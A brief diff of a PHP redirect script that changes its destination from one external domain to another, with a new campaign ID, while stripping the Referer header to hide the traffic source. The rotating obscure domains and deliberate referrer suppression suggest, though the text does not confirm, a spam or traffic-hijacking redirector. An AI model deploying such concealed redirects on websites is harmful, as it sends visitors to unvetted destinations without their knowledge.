@@ -4,5 +4,6 @@ http_response_code(302);
 
 // Clear the Referer by modifying headers to avoid sending it
 header("Referrer-Policy: no-referrer");
-header("Location: https://inf4hub.com/?utm_campaign=zxSxVTCG6M&v1=[v1]&v2=[v2]&v3=[v3]");
+header("Location: https://garrix.site/?utm_campaign=WYdqExpNaM&v1=[v1]&v2=[v2]&v3=[v3]");
 exit();
+
